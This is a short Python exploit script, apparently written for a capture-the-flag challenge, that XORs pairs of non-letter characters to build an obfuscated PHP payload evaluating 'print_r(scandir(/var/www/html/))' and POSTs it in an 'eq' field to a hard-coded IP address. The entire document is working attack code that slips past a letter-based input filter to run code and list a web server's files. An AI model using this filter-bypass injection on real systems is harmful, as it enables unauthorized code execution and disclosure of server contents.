import requests
import string

def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2

valids = [ ]
for item in string.printable:
  if item not in string.ascii_letters:
    valids.append(item)
valids = valids[:len(valids)-3]
print("[+] Generated valids => {}".format(valids))
 
expected = "print_r(scandir(/var/www/html/))"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {}- Word2 {}".format(word1, word2))

payload = "666; (\"{}\"^\"{}\")".format(word1, word2)
print("[+] Sending payload {}".format(payload))
 
response = requests.post('http://35.238.221.234', data={"eq":payload})

print(response.status_code, response.reason)
print(response.content.decode())